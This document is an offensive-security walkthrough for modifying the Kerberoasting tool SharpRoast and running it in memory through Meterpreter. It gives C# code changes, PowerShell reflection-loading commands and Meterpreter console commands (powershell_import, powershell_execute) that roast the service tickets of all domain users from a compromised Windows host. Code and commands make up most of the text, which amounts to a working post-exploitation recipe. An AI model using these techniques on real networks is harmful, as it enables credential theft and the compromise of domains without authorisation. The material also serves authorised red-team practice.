# Running a .NET assembly in memory with Meterpreter
What you'll need:
    - Visual Studio Code Installed on a Windows VM
    - .NET 3.5 and/or .NET 4.0 features installed in Visual Studio
    - Some C# code to run, this walkthrough will use [SharpRoast](https://github.com/GhostPack/SharpRoast/tree/348ba15f0c1c0d5bf8c029776dbba6fe71718489)

## Building the Project
Many C# projects come with .sln files, open that with Visual Studio and it will
automatically set up the project. To follow along, download SharpRoast from Github and open it up
in Visual Studio on the Windows VM. Or if you're writing the code yourself, just load
up your project. Make sure the project builds correctly and runs as expected before
modifying.

## Modifying the Project
All that is required is to break some abstraction barriers and set the classes and functions
that we want to run in Meterpreter to public. For SharpRoast, this involves changing the following lines (7-12) from:
```
namespace SharpRoast
{
    class Program
    {
        static bool debug = false;
```

TO

```
namespace SharpRoast
{
    public class Program
    {
        static bool debug = false;
```

Additionally, let's add a function to allow us to run SharpRoast in memory with the same behavior as on the command line. This can go anywhere inside the Program class.


```
public static void Command(string command="all")
{
    string[] args = command.Split(null);
    Main(args);
}
```

If you are expecting to see stdout, we'll need to patch that to be redirected to a file on disk. I have not yet figured out how to see the stdout stream
in the Meterpreter session. Do the following (in the import section add):

```
using System.IO;
```

And modify the added function to redirect stdout to a file:
```
static void Main(string[] args)
 {
     FileStream fs = new FileStream("C:\\inmemorystdout.txt", FileMode.Create);
     StreamWriter sw = new StreamWriter(fs);
     TextWriter old_stdout = Console.Out;
     Console.SetOut(sw);
     if (args.Length == 0)
...
clip
...
	 Console.SetOut(old_stdout);
     sw.Close();
}
```

Now rebuild the SharpRoast project (or your own project) in its Release configuration. It can still be built as an .NET executable.


## Loading and Testing with Powershell
Before loading with Meterpreter, test locally. Open up a Powershell prompt and load the file with the following command.
```
PS C:\Users\vmtest> [Reflection.Assembly]::LoadFile("C:\full\path\to\the.exe")

GAC    Version        Location
---    -------        --------
False  v2.0.50727     C:\full\path\to\the.exe


PS C:\Users\vmtest>
```

Now, let's run a command.
```
PS C:\Users\vmtest> [SharpRoast.Program]::Command("/?")

  SharpRoast Usage:

        SharpRoast.exe all                                       -   Roast all users in current domain
        SharpRoast.exe all "domain.com\user" "password"          -   Roast all users in current domain using alternate creds
        SharpRoast.exe "blah/blah"                               -   Roast a specific specific SPN
        SharpRoast.exe "blah/blah" "domain.com\user" "password"  -   Roast a specific SPN using alternate creds
        SharpRoast.exe username                                  -   Roast a specific username
        SharpRoast.exe username "domain.com\user" "password"     -   Roast a specific username using alternate creds
        SharpRoast.exe "OU=blah,DC=testlab,DC=local"             -   Roast users from a specific OU
        SharpRoast.exe "SERVICE/host@domain.com"                 -   Roast a specific SPN in another (trusted) domain
        SharpRoast.exe "LDAP://DC=dev,DC=testlab,DC=local"       -   Roast all users in another (trusted) domain
PS C:\Users\vmtest>
```

Note the inheritance structure for the function, we modified `class Program` to make it public, and also added a public function `Command`.
If it works as expected, it's ready to use with Meterpreter.

## Loading with Meterpreter
First, copy your .NET executable to your Meterpreter server, and change the extension from `.exe` to `.dll`. If you're curious,
this is because Metasploit will refuse to load a file as a library if does not end with `.dll`.  Next get a Meterpreter session on a Windows box with 
the appropriate .NET version installed (run it as admin because the module is writing to C:/). Then execute the following commands.

```
msf5 exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_import SharpRoast_Walkthrough.dll
[+] File successfully imported. No result was returned.
meterpreter > powershell_execute [SharpRoast.Program]::Command(\"all\")
[+] Command execution completed:
meterpreter > ls C:/
```